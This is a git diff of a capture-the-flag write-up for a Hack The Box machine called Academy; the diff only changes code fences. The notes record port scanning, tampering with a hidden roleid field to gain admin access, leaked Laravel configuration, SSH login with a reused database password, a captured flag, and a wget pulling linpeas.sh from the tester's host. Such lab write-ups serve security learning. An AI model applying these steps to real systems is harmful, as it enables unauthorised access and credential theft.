@@ -21,7 +21,7 @@
 
 nmap -p 1-65535 -T4 -A -v 10.10.10.215
 
-'''
+```
 kali@kali:~/Documents/HTB/atp$ nmap -p 1-65535 -T4 -A -v 10.10.10.215
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-14 13:45 EST
 NSE: Loaded 154 scripts for scanning.
@@ -113,7 +113,7 @@ Completed NSE at 13:46, 0.00s elapsed
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 45.64 seconds
-'''
+```
 
 22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -138,7 +138,7 @@ The website http://academy.htb has a register page, create an account and login 
 
 Noticed an admin page login exists at http://academt.htb/admin.php the user I created didn't allow access. Can I make the user into an admin? Couldn't find a way to request better access. What gives the user a role when they register. I inspect the register.php page and find the code below.
 
-'''
+```
 
 <html>
 <head>
@@ -287,13 +287,13 @@ html, body {
 </div>
 </body>
 </html>
-'''
+```
 The interestign line is this                 
 <input type="hidden" value="0" name="roleid" />
 
 I then cretaed an ID with roleid as 1. This user can access the admin panel. That displays this -
 
-'''
+```
 Academy Launch Planner
 Item 	Status
 Complete initial set of modules (cry0l1t3 / mrb3n) 	done
@@ -303,7 +303,7 @@ Prepare launch campaign 	done
 Separate student and admin roles 	done
 Fix issue with dev-staging-01.academy.htb 	pending
 
-'''
+```
 
 This url isn't available, added it as a name against the same IP to check for named webserver?????
 
@@ -311,7 +311,7 @@ Get retruned a website.
 
 That contains the following, wonder if I can login with the sql account?
 
-'''
+```
 Server/Request Data
 HTTP_HOST 	"dev-staging-01.academy.htb"
 HTTP_USER_AGENT 	"Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
@@ -410,14 +410,14 @@ PUSHER_APP_CLUSTER 	"mt1"
 MIX_PUSHER_APP_KEY 	""
 MIX_PUSHER_APP_CLUSTER 	"mt1"
 
-'''
+```
 
 
 Couldn't login with the dbname, but what is the app key for? Laravel 
 
 SearchSplout brings back 
 
-'''
+```
 ------------------------------------------------------------- ---------------------------------
  Exploit Title                                               |  Path
 ------------------------------------------------------------- ---------------------------------
@@ -429,7 +429,7 @@ UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary File  | php/webapps/46389
 ------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 
-'''
+```
 What is the PHP one?
 
 
@@ -453,28 +453,28 @@ DB_PASSWORD=mySup3rP4s5w0rd!!
 Couldn't login on mysql or ssh.
 Tried other userid that exist in /home 
 
-'''
+```
 21y4d
 ch4p
 cry0l1t3
 egre55
 g0blin
 mrb3n
-'''
+```
 
 Succesful logged in ssh 
-'''
+```
 ssh cry0l1t3@academy 
 password as mySup3rP4s5w0rd!!
 
 cat user.txt 
-'''
+```
 The user key is 51c9996bae9d8151cf84686078a172c1
 
 
 Try LinPeas to enum
 
-'''
+```
 wget 10.10.14.38/linpeas.sh
 --2020-11-16 19:50:48--  http://10.10.14.38/linpeas.sh
 Connecting to 10.10.14.38:80... connected.
@@ -2103,5 +2103,5 @@ passwd files from being
 /var/www/html/academy/database/factories/UserFactory.php:$2y$10$TKh8H1.PfQx37YgCzwiKb.KjNyWgaHb9cbcoQgdIVFlYg7B77UdFm                                                                                        
 /var/www/html/htb-academy-dev-01/database/factories/UserFactory.php:$2y$10$TKh8H1.PfQx37YgCzwiKb.KjNyWgaHb9cbcoQgdIVFlYg7B77UdFm
 
-'''
+```
 
